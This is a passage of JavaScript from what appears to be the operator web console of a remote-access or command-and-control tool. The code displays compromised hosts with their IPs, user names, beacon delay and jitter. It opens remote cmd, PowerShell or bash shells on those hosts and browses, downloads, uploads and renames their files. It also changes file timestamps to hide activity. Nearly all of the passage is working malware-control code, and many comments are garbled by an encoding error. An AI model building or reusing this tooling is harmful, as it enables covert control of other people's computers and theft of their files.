                    taskid:AgentTaskId
                }
            );
            return true;
        }
        async getFile(path){
            if(!path){
                return;
            }
            let splitSizeInput = this.getDialogNode('#splitSize');
            let splitSize = splitSizeInput && splitSizeInput.value
                ? parseFloat(splitSizeInput.value) * 1024 * 1024
                : 0;
            let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
            webSocketClient.send(
                
                "msg",
                {
                    uid:this.uid,
                    msg:powershell,
                    taskid:AgentTaskId
                }
            );
        }
        renderFileList(fileContent, shell_dir) {
            const div_file = this.getDialogNode('#file_resp') || document.querySelector('#file_resp');
            if (!div_file) return false;

            let cur_dir_p = document.getElementById('cur_dir');
            if (cur_dir_p) {
                cur_dir_p.textContent = shell_dir;
            }

            if (Array.isArray(fileContent)) {
                fileContent = fileContent.join("\n");
            } else if (fileContent && typeof fileContent === "object") {
                fileContent = fileContent.data ?? fileContent.text ?? "";
            }

            if (typeof fileContent !== "string") {
                console.warn("renderFileList bad data:", fileContent);
                return false;
            }

            const dir_list = fileContent.split(/\r?\n/).map(s => s.trim()).filter(Boolean);
            if (dir_list.length === 0) {
                return false;
            }

            const fragment = document.createDocumentFragment();
            let renderedCount = 0;

            for (let i = 0; i < dir_list.length; i++) {
                let file = dir_list[i];

                let new_file = document.createElement('div');
                new_file.classList.add('directory');

                let isDir = file.startsWith("dir ");
                let isFil = file.startsWith("fil ");
                let type = isDir ? "dir" : (isFil ? "fil" : null);
                if (!type) {
                    continue;
                }

                let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
                let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);

                let name = "", size = "", perm = "", mtime = "";
                if (matchFile && type === "fil") {
                    name = matchFile[2];
                    size = matchFile[3];
                    perm = matchFile[4];
                    mtime = matchFile[5];
                } else if (match && type === "dir") {
                    name = match[2];
                    perm = match[3];
                    mtime = match[4];
                } else {
                    continue;
                }

                let full_path = shell_dir ? (shell_dir + "/" + name) : name;
                new_file.dataset.path = full_path;

                let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
                let timeBtn = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";

                if (type === "dir") {
                    new_file.classList.add('dir');
                    new_file.innerHTML =
                        '<span class="icon-dir">📁</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        renameBtn + timeBtn;

                    new_file.onclick = () => {
                        this.move_file(0, name);
                    };
                } else {
                    new_file.classList.add('file');
                    new_file.innerHTML =
                        '<span class="icon-file">📄</span>' +
                        '<span class="filename">' + name + '</span>' +
                        '<span class="filesize">&lt;' + size + '&gt;</span>' +
                        '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
                        '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
                        '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
                        renameBtn + timeBtn;

                    new_file.addEventListener('click', () => {
                        this.getFile(new_file.dataset.path);
                    });
                    new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
                        e.stopPropagation();
                        this.getFile(new_file.dataset.path);
                    });
                }

                new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();
                    const filenameSpan = new_file.querySelector('.filename');
                    const oldName = filenameSpan.innerText;
                    const oldPath = new_file.dataset.path;

                    const newName = prompt("Enter the new name:", oldName);
                    if (!newName || newName === oldName) return;

                    const lastSlash = oldPath.lastIndexOf('/');
                    const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
                    const newPath = dirPath ? (dirPath + '/' + newName) : newName;
                    const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
                    webSocketClient.send("msg", {
                        uid: this.uid,
                        msg: cmd,
                        taskid: AgentTaskId
                    });
                    filenameSpan.innerText = newName;
                    new_file.dataset.path = newPath;
                });

                new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
                    e.stopPropagation();

                    const currentPath = new_file.dataset.path;
                    const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
                    if (!newTime) return;

                    const cmd = "CHANG_FILE_TIME*//*" + currentPath + "*//*" + newTime;
                    webSocketClient.send("msg", {
                        uid: this.uid,
                        msg: cmd,
                        taskid: AgentTaskId
                    });

                    new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
                });

                fragment.appendChild(new_file);
                renderedCount++;
            }

            if (renderedCount === 0) {
                return false;
            }

            div_file.innerHTML = '';
            div_file.appendChild(fragment);
            return true;
        }
        async history_file(uid) {
            uid = uid || this.uid;
            const historyParent = this.getDialogNode('#history');
            const historyData = Array.isArray(fileQueues[uid]) ? fileQueues[uid] : [];
            if(historyParent){
                historyParent.innerHTML='';
                if(historyData.length > 0){
                    historyData.forEach((item)=>{
                        let listDiv=document.createElement('div');
                        listDiv.classList.add('history-item');
                        const labelSpan = document.createElement('span');
                        labelSpan.className = 'history-item-label';
                        labelSpan.textContent = item.list || '';
                        listDiv.onclick=()=>{
                            if(item.file){
                                this.shell_dir=item.list;
                                this.renderFileList(
                                    item.file,
                                    item.list
                                );
                            }
                        };
                        let delBtn=document.createElement('button');
                        delBtn.type = 'button';
                        delBtn.className = 'history-delete-btn';
                        delBtn.textContent='🗑';
                        delBtn.title='delete';
                        delBtn.onclick = async (e) => {
                            e.stopPropagation();
                            const index = Array.from(historyParent.children).indexOf(listDiv);
                            if (index < 0) {
                                customLog("History not found");
                                return;
                            }
                            try {
                                const responsePromise = webSocketClient.waitForMessage(
                                    (msg) =>
                                        msg.path === "delFileList" &&
                                        msg.uid === uid &&
                                        msg.index === String(index) &&
                                        msg.code === 200 &&
                                        msg.taskid === AgentTaskId,
                                )
                                const sent = await webSocketClient.send("delFileList", {
                                    uid: uid,
                                    index: String(index),
                                    taskid: AgentTaskId
                                });
                                if (!sent) {
                                    customLog("Delete failed");
                                    return;
                                }
                                const data = await responsePromise;
                                if (data && data.code === 200 && data.uid === uid && data.index === String(index) && data.taskid === AgentTaskId) {
                                    if (Array.isArray(fileQueues[uid])) {
                                        fileQueues[uid].splice(index, 1);
                                    }
                                    listDiv.remove();
                                    customLog("History deleted");
                                } else {
                                    customLog(data?.message || "Delete failed");
                                }
                            } catch (err) {
                                console.error("delFileList error:", err);
                                customLog("Delete failed");
                            }
                        };
                        listDiv.appendChild(labelSpan);
                        listDiv.appendChild(delBtn);
                        historyParent.appendChild(listDiv);
                    });
                }
            }
        }
        stopFileListPolling(taskId = null) {
            if (this.fileListPollTimer) {
                clearTimeout(this.fileListPollTimer);
                clearInterval(this.fileListPollTimer);
                this.fileListPollTimer = null;
            }
            this.fileListPollBusy = false;
            if (!taskId || this.fileListTaskId === taskId) {
                this.fileListTaskId = null;
                this.fileListPendingDir = "";
            }
        }
        canUseFileDialog(taskId = "") {
            if (!this.uid || !this.dialogEl || !this.dialogEl.isConnected) {
                return false;
            }
            if (taskId && this.fileListTaskId !== taskId) {
                return false;
            }
            return true;
        }
        async look_file(dir) {
            dir = dir || this.shell_dir || "./";
            if (!this.uid || !dir) return false;

            this.stopFileListPolling();

            const powershell = "LOOK_UP_FILE*//*" + dir;
            const taskId = createRuntimeTaskId("filelist");
            this.fileListTaskId = taskId;
            this.fileListPendingDir = dir;
            this.fileListPollBusy = false;

            const pollOnce = async () => {
                if (!this.canUseFileDialog(taskId) || this.fileListPollBusy) {
                    return false;
                }

                this.fileListPollBusy = true;
                try {
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => {
                            const sameTask = msg.taskid == null || String(msg.taskid) === String(taskId);
                            return this.canUseFileDialog(taskId) &&
                                msg.path === "getFileList" &&
                                msg.code === 200 &&
                                String(msg.uid) === String(this.uid) &&
                                sameTask;
                        }
                    );

                    const sent = await webSocketClient.send("getFileList", {
                        uid: this.uid,
                        taskid: taskId
                    });

                    if (!sent) {
                        return false;
                    }

                    const result = await responsePromise;
                    if (!this.canUseFileDialog(taskId) || !result) {
                        return false;
                    }

                    const payload =
                        result.data ??
                        result.content ??
                        result.text ??
                        result.fileContent ??
                        result.list ??
                        "";

                    if (!String(payload || "").trim()) {
                        return false;
                    }

                    this.shell_dir = dir;
                    const rendered = this.renderFileList(payload, this.shell_dir);
                    if (rendered) {
                        this.history_file(this.uid);
                        this.stopFileListPolling(taskId);
                        return true;
                    }

                    return false;
                } catch (err) {
                    if (!this.canUseFileDialog(taskId)) {
                        return false;
                    }
                    if (err?.message === "wait message timeout") {
                        return false;
                    }
                    return false;
                } finally {
                    this.fileListPollBusy = false;
                }
            };

            const loop = async () => {
                while (this.canUseFileDialog(taskId)) {
                    const rendered = await pollOnce();
                    if (rendered) {
                        break;
                    }
                    if (!this.canUseFileDialog(taskId)) {
                        break;
                    }
                    await new Promise(r => setTimeout(r, 1200));
                }
                this.stopFileListPolling(taskId);
            };

            try {
                const sent = await webSocketClient.send("msg", {
                    uid: this.uid,
                    msg: powershell,
                    taskid: taskId
                });

                if (!sent) {
                    this.stopFileListPolling(taskId);
                    return false;
                }

                loop();
                return true;
            } catch (err) {
                console.error(err);
                this.stopFileListPolling(taskId);
                return false;
            }
        }
         async move_file(num, cur_dir) {
            let cur_dir_p = this.getDialogNode("#cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true; // 閿佸畾鎿嶄綔
            let temp_dir = this.shell_dir; // 淇濆瓨褰撳墠璺緞
            try {
                if (this.uid) {
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..'; // 杩斿洖涓婄骇鐩綍
                    } else if (num === 0) {
                        // 瑙ｆ瀽鐩綍璺緞
                        this.shell_dir += "/" + cur_dir ;
                    }
                    // 纭繚 look_file 寮傛鎵ц
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 鍥為€€璺緞
                        customLog("!Does not exist or has no permission to access this directory?");
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 淇濊瘉鏈€缁堣В閿�
                if (cur_dir_p) {
                    cur_dir_p.textContent = "Path:\t" + this.shell_dir;
                }
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = this.getDialogNode("#cur_dir_p");
            let temp_dir = this.shell_dir;
            let directoryInput = this.getDialogNode("#directoryInput");
            let directory = directoryInput ? directoryInput.value : "";
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 濡傛灉 look_file 杩斿洖 false锛屽垯鍥為€€鐩綍
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            if (cur_dir_p) {
                cur_dir_p.textContent="Path:\t"+this.shell_dir;
            }
        }
        switchVer(value){
            let cmd = "SWITCH_VERSION*//*"+value;
            webSocketClient.send(
                "msg",
                {
                    uid:this.uid,
                    msg:cmd,
                    taskid:AgentTaskId
                }
            );
        }
    }
    
    //涓婚〉闈㈢被
    class lain_index{
        renderUserList(data) {
            let container = document.getElementById('div_index');
            if (!container) {
                return;
            }
            container.innerHTML = "";
            data.forEach(key=>{
                let userDiv = document.createElement('div');
                userDiv.classList.add('ip-info');
                userDiv.id = key.uid + "info";
                let os = (key.os || "").toLowerCase();
                let osEmoji = "💻";
                if(os.includes("linux")){
                    osEmoji="🐧";
                }
                else if(os.includes("macos")){
                    osEmoji="🍎";
                }
                else if(os.includes("android")){
                    osEmoji="📱";
                }
                let pluginButtons = "";
                let pluginParam = key.plugin_parameter;
                if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
                    for (let codeword in pluginParam[os]) {
                        let paramDescList = pluginParam[os][codeword];
                        let encodedDesc = encodeURIComponent(
                            (Array.isArray(paramDescList) ? paramDescList : []).join(',')
                        );
                        pluginButtons +=
                        '<button type="button" class="console-link" onclick="showPluginDialog(\'' +
                        key['uid'] +
                        '\', \'' +
                        os +
                        '\', \'' +
                        encodedDesc +
                        '\', \'' +
                        codeword +
                        '\')">[' + codeword + ']</button>';
                    }
                }
                let userHTML = '<div class="conn-container">' +
                                '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                '<span class="ip-address">' + key['host'] + '/</span>' +
                                '<span class="ip-address">' + key['uid'] + '/</span>' +
                                '<span class="ip-address">' + key['protocol'] + '/</span>' +
                                '<span class="ip-address">'+ key['os']  + '/' + osEmoji + '</span>' +
                                '<div class="os-container">' +
                                    '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
                                '</div>' +
                            '</div>' +
                            '<div class="button-container">' +
                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                            '</div>' +
                            '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">Path:</strong><strong class="s_right">' + (key['current_dir'] || '-') + '</strong></p>' +
                                '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
                                '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
                                '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                '<p><strong class="s_left">Server:</strong><strong class="s_right">' + key['server'] + '</strong></p>' +
                                '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                            '</div>' +
                            '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                '<button type="button" class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
                                '<button type="button" class="console-link file-open-btn" data-uid="' + key['uid'] + '" data-host="' + key['host'] + '" data-dir="' + (key['current_dir'] || './') + '">📁</button>' +
                                '<button type="button" class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
                                pluginButtons +
                            '</div>' +
                            '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';
                            userDiv.innerHTML = userHTML;
                            container.appendChild(userDiv);
            });
        }
        showTerminalDialog(uid, host, os) {
            const dialogId = "terminal-dialog-" + uid;
            let dialog = document.getElementById(dialogId);
            let terminal = null;
            if (dialog) {
                dialog.style.display = "block";
                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                terminal = window.terminalSessions ? window.terminalSessions[uid] : null;
                if (terminal) {
                    window.activeTerminal = terminal;
                    if (terminal.currentInput && terminal.currentInput.isConnected) {
                        terminal.currentInput.focus();
                    }
                }
                return;
            }
            dialog = document.createElement("div");
            dialog.id = dialogId;
            dialog.dataset.uid = uid;
            dialog.style.position = "fixed";
            dialog.style.top = "5%";
            dialog.style.left = "50%";
            dialog.style.transform = "translateX(-50%)";
            dialog.style.background = "linear-gradient(180deg, #fbfdff 0%, #f2f6fb 100%)";
            dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
            dialog.style.maxWidth = "900px";
            dialog.style.width = "90vw";
            dialog.style.maxHeight = "90vh";
            dialog.style.overflow = "auto";
            dialog.style.border = "1px solid rgba(138, 160, 178, 0.25)";
            dialog.style.borderRadius = "18px";
            dialog.style.boxShadow = "0 24px 60px rgba(44, 72, 98, 0.18)";
            dialog.style.padding = "18px";
            dialog.style.userSelect = "none";
            dialog.style.touchAction = "none";
            dialog.style.backdropFilter = "blur(10px)";
            document.body.appendChild(dialog);

            // 鎷栧姩鏉″拰鍐呭
            dialog.innerHTML =
                '<div class="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:36px;cursor:move;background:linear-gradient(90deg, rgba(230,236,243,0.95), rgba(243,247,251,0.9));border-top-left-radius:18px;border-top-right-radius:18px;z-index:10001;border-bottom:1px solid rgba(138,160,178,0.18);"></div>' +
                '<button class="dialog-close-btn terminal-close-btn" type="button">x</button>' +
                '<div class="shell-container" style="margin-top:34px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 4px 14px 4px;">' +
                "<label for='options' style='color:#4f6477;font-size:13px;'>Select Shell:</label>" +
                "<select class='terminal-shell-select' name='options' style='min-width:150px;padding:8px 12px;border-radius:999px;border:1px solid rgba(138,160,178,0.35);background:#fff;color:#314657;'></select>" +
                "<p class='terminal-hostname' style='margin-left:auto;font-size:12px;color:#6a7f92;'>Host: " + host + "</p>" +
                '</div>' +
                '<div class="terminal" style="background:#f8fbff;border-radius:16px;border:1px solid rgba(160,176,194,0.32);padding:16px;min-height:420px;color:#000000;box-shadow:inset 0 1px 0 rgba(255,255,255,0.72);">' +
                '<div class="input-container"></div>' +
                '</div>' +
                '<link rel="stylesheet" href="/`+web_css+`">';

            // 鍏抽棴鎸夐挳
            dialog.querySelector(".terminal-close-btn").onclick = function () {
                if (terminal) {
                    terminal.stopAllResultsForUid(uid);
                    if (window.terminalSessions) {
                        delete window.terminalSessions[uid];
                    }
                    if (window.activeTerminal === terminal) {
                        window.activeTerminal = null;
                    }
                }
                dialog.remove();
            };

            // 鎷栧姩閫昏緫锛堝吋瀹筆C鍜岀Щ鍔ㄧ锛屼笖绐楀彛涓嶈兘绉诲嚭椤甸潰锛�
            const dragBar = dialog.querySelector(".terminal-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0, startX = 0, startY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 闄愬埗绐楀彛涓嶇Щ鍑洪〉闈�
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 鎷栧姩鍚庡彇娑堝眳涓�
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            setTimeout(() => {
                // 鍒濆鍖� shell 閫夐」
                const optionsElement = dialog.querySelector(".terminal-shell-select");
                if (os == "win") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='cmd.exe'>cmd</option><option value='powershell.exe'>powershell</option><option value='custom'>customize shell</option>";
                } else if (os == "linux" || os == "macos") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='bash'>bash</option><option value='sh'>sh</option><option value='custom'>customize shell</option>";
                } else if (os == "android") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
                }

                // 鍒涘缓 terminal 瀹炰緥骞跺垵濮嬪寲
                terminal = new lain_terminal();
                terminal.uid = uid;
                terminal.dialogEl = dialog;

                // 璁� terminal 鍐呴儴绠＄悊杈撳叆妗嗗拰浜嬩欢
                terminal.inputContainer = dialog.querySelector(".terminal .input-container");
                terminal.terminalEl = dialog.querySelector(".terminal");
                window.terminalSessions[uid] = terminal;
                window.activeTerminal = terminal;
                terminal.createInput();
                dialog.addEventListener("mousedown", function() {
                    window.activeTerminal = terminal;
                    dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                });

                // shell鍒囨崲
                optionsElement.addEventListener("change", function () {
                    const selectedValue = this.value;
                    if (selectedValue === "custom") {
                        const customEnv = prompt("Enter a shell:");
                        if (customEnv) {
                            const newOption = document.createElement("option");
                            newOption.value = customEnv;
                            newOption.textContent = customEnv;
                            this.insertBefore(newOption, this.querySelector("option[value='custom']"));
                            this.value = customEnv;
                            terminal.switchVer(customEnv);
                        } else {
                            this.value = "Shell";
                        }
                    } else {
                        terminal.switchVer(selectedValue);
                    }
                });
            }, 200);
        }
        showFileDialog(uid, host, dir) {
            const dialogId = "file-dialog-" + uid;
            let dialog = document.getElementById(dialogId);
            let fileManager = window.fileManagerSessions ? window.fileManagerSessions[uid] : null;
            if (dialog) {
                dialog.style.display = "block";
                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                if (fileManager) {
                    window.activeFileManager = fileManager;
                    if (dir && dir !== fileManager.shell_dir) {
                        fileManager.shell_dir = dir;
                        fileManager.look_file(dir);
                    }
                }
                return;
            }
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = dialogId;
                dialog.dataset.uid = uid;
                dialog.style.position = "fixed";
                dialog.style.top = "5%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                dialog.style.maxWidth = "1100px";
                dialog.style.width = "95vw";
                dialog.style.height = "85%";
                dialog.style.overflow = "hidden";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            }

            // 鎷栧姩鏉″拰鍐呭
            dialog.innerHTML =
                '<div id="file-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="file-close-btn" class="dialog-close-btn" type="button">x</button>' +
                '<div style="display:flex;width:100%;margin-top:32px;position:relative;height:calc(90vh - 48px);overflow:hidden;">' +
                    '<div id="history" class="file-history" style="width:200px;min-width:80px;max-width:80vw;transition:width 0.1s;"></div>' +
                    '<div id="file-history-resizer" style="min-width:6px;cursor:col-resize;background:#e0e0e0;z-index:10;"></div>' +
                    '<div class="filecontainer">' +
                        '<div>' +
                            '<div style="display: flex; align-items: center;">' +
                                "<p id='hostname' style='margin-right: 25px;'>Host:" + host + "</p>" +
                                '<label for="splitSize">Enter the split size (each part in MB): </label>' +
                                '<input type="number" id="splitSize" min="1" placeholder="Enter part" />' +
                            '</div>' +
                        '</div>' +
                        '<div id="file_resp" class="file-manager"></div>' +
                        '<form id="uploadForm">' +
                            '<input type="file" id="uploadFile" name="uploadFile" required>' +
                            '<input class="fileinput" type="submit" value="Upload">' +
                        '</form>' +
                        '<div class="dir-btn" id="dir-btn">&#x21B6; ../</div>' +
                        '<div class="dir-controls">' +
                            '<p id="cur_dir_p"></p>' +
                            '<input type="text" id="directoryInput">' +
                            '<button id="moveDirButton" type="button">Goto folder</button>' +
                        '</div>' +
                    '</div>' +
                '</div>' +
                '<link rel="stylesheet" href="/`+web_css+`">';

            // 鍏抽棴鎸夐挳
            dialog.querySelector("#file-close-btn").onclick = function () {
                if (fileManager && typeof fileManager.stopFileListPolling === "function") {
                    fileManager.stopFileListPolling();
                }
                if (window.fileManagerSessions) {
                    delete window.fileManagerSessions[uid];
                }
                if (window.activeFileManager === fileManager) {
                    window.activeFileManager = null;
                }
                dialog.remove();
            };

            // 鎷栧姩閫昏緫锛堝吋瀹筆C鍜岀Щ鍔ㄧ锛屼笖绐楀彛涓嶈兘绉诲嚭椤甸潰锛�
            const dragBar = dialog.querySelector("#file-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 闄愬埗绐楀彛涓嶇Щ鍑洪〉闈�
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 鎷栧姩鍚庡彇娑堝眳涓�
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            // 鏍峰紡锛堝唴瀹瑰悗 append锛岄伩鍏嶈 innerHTML 瑕嗙洊锛�
            const style = document.createElement("style");
            style.textContent =
                ".dir-btn{margin:10px 0;cursor:pointer;color:#007bff;}" +
                ".dir-controls{margin:10px 0;display:flex;align-items:center;gap:8px;}" +
                ".fileinput{margin-left:8px;}" +
                ".directory,.file{padding:6px 0;border-bottom:1px solid #eee;display:flex;align-items:center;gap:8px;}" +
                ".icon-dir,.icon-file{margin-right:4px;}" +
                ".file-history{overflow:auto;background:#fafafa;border-right:1px solid #eee;}" +
                ".filecontainer{background:#fff;}" +
                ".file-manager{min-width:80px;}";
            dialog.appendChild(style);

            // 鎷栧姩鏀瑰彉 file-history 鍜� filecontainer 瀹藉害锛堣仈鍔� file-manager锛�
            setTimeout(function () {
                const resizer = dialog.querySelector('#file-history-resizer');
                const history = dialog.querySelector('#history');
                const filecontainer = dialog.querySelector('.filecontainer');
                const parent = resizer ? resizer.parentElement : null;
                let resizing = false, startX = 0, startWidth = 0, parentWidth = 0, resizerWidth = 0;

                if (!resizer || !history || !filecontainer || !parent) {
                    return;
                }

                resizer.addEventListener('mousedown', function(e) {
                    resizing = true;
                    startX = e.clientX;
                    startWidth = history.offsetWidth;
                    parentWidth = parent.offsetWidth;
                    resizerWidth = resizer.offsetWidth;
                    document.body.style.cursor = 'col-resize';
                    document.addEventListener('mousemove', resize);
                    document.addEventListener('mouseup', stopResize);
                });

                function resize(e) {
                    if (!resizing) return;
                    let newWidth = startWidth + (e.clientX - startX);
                    // 闄愬埗鏈€灏忔渶澶у搴�
                    newWidth = Math.max(80, Math.min(newWidth, parentWidth - 80 - resizerWidth));
                    history.style.width = newWidth + 'px';
                    filecontainer.style.width = (parentWidth - newWidth - resizerWidth) + 'px';
                    filecontainer.style.flex = 'none';
                }

                function stopResize() {
                    resizing = false;
                    document.body.style.cursor = '';
                    document.removeEventListener('mousemove', resize);
                    document.removeEventListener('mouseup', stopResize);
                }
            }, 200);

            // 閫昏緫
            setTimeout(function () {
                const fliemanage = new lain_terminal();
                fileManager = fliemanage;
                fliemanage.uid = uid;
                fliemanage.dialogEl = dialog;
                window.fileManagerSessions[uid] = fliemanage;
                window.activeFileManager = fliemanage;
                
                let hostname = dialog.querySelector("#hostname");
                if (hostname) {
                    hostname.innerText = "Host:" + host;
                }

                // 涓婁紶琛ㄥ崟
                dialog.querySelector("#uploadForm").addEventListener("submit",
                async function(event){
